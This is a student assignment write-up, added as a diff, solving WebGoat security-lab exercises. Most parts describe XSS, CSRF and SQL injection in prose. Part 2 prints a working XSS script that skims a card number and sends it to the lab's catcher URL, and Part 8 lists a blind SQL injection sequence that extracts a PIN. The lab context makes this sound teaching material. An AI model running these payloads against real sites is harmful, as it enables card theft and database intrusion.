@@ -1,0 +1,71 @@
+#Ata Tuzuner, 1006130633, ata.tuzuner@mail.utoronto.ca
+#Victoria Del Campo, 1006339366, victoria.delcampo@mail.utoronto.ca
+
+Part 1 Explanation:
+A form and script has been input into the search field. Once the submit button is pressed, our form is displayd in the results section. This tricks the user to sign in. Once the user signs in, the credentials are sent to the mentioned url with relevant parameters in our script.
+
+Part 2 Explanation:
+The exploitable field is the three digit access code input field. The reason is that the wrong code will be displayed on the page. We sneak in a script in here. We encode it in the url so that when the user loads it in, the script is already on the page and active. We put "000" before our script to disguise our hack. Once the user inputs their credit card number and hits the "Buy" button, their cardnumber is sent to the given URL by our script. The unencoded version of the URL is as follows (assume one line):
+
+    http://localhost:8090/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=000
+    <script>
+        const input2 = document.forms[0].elements["input2"].value;
+        document.forms[0].elements["input2"].value = "000";
+
+        addEventListener("submit", (e) => {
+            if (e.submitter.getAttribute("name") == "buy"){
+                const in1 = document.forms[0].elements["input1"].value;
+                const in2 = document.forms[0].elements["input2"].value;
+                const url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + in1;
+
+                fetch(url, {
+                method: "POST",
+                body: JSON.stringify({
+                    cardNumber: in1
+                }),
+                headers: {
+                    "Content-type": "application/json; charset=UTF-8"
+                }
+            });
+            }
+        });
+    </script>
+
+Part 3 Explanation:
+The exploitable field is the message field in the email. Once the user submits the message, it will appear below in the message list. Once the message link is clicked, then the request will be sent to the given URL.
+
+Part 4 Explanation:
+The exploitable field is the message field. We used two iframes to first request a transfer and confirm the transfer in the same attack servlet. Here, a script was used to load the result of the first iframe into the source of the second iframe. The second URL is structured to confirm the transaction.
+
+Part 5 Explanation:
+The exploitable field is the message field. We used two iframes and traversed into the document element produced by the request of our first iframe to retrieve the token value. Then, our script creates a URL using this token to by-pass the second stage. Once again, this URL is loaded into the second iframe to accomplish this result.
+
+Part 6 Explanation:
+Using our exploit, we force the logic to a true result using an OR with a true statement (1=1) in order to get all the records in the database.
+
+Part 7 Explanation:
+By using a semi-colon and adding an update statement at the end of the initial query, we change the designated value. The second part follows the same principle where instead of an update statement we use a create trigger to create a function that changes the email of each new user as we desire.
+
+Part 8 Explanation:
+We find the following by trial and error.
+0000 is a valid account number.
+101 is not a valid account number.
+We use 0000 and OR it with true test statements to narrow down the pin number.
+Using '>' and '<' operators to narrow down the number.
+Finally using '=' to find the exact pin number.
+Following are the inputs we use to find the pin number and the response we got from server ('+' means the given statement is true and '-' means false)
+0000 or (select pin from credit where cc_number = 1234123412341234) > 100       +
+0000 or (select pin from credit where cc_number = 1234123412341234) > 1000      +
+0000 or (select pin from credit where cc_number = 1234123412341234) > 10000     -
+0000 or (select pin from credit where cc_number = 1234123412341234) > 3000      +
+0000 or (select pin from credit where cc_number = 1234123412341234) > 6000      -
+0000 or (select pin from credit where cc_number = 1234123412341234) > 4000      -
+0000 or (select pin from credit where cc_number = 1234123412341234) > 3500      -
+0000 or (select pin from credit where cc_number = 1234123412341234) > 3200      +
+0000 or (select pin from credit where cc_number = 1234123412341234) > 3400      -
+0000 or (select pin from credit where cc_number = 1234123412341234) > 3300      +
+0000 or (select pin from credit where cc_number = 1234123412341234) > 3350      -
+0000 or (select pin from credit where cc_number = 1234123412341234) > 3325      -
+0000 or (select pin from credit where cc_number = 1234123412341234) > 3312      -
+0000 or (select pin from credit where cc_number = 1234123412341234) > 3320      -
+0000 or (select pin from credit where cc_number = 1234123412341234) = 3318      +
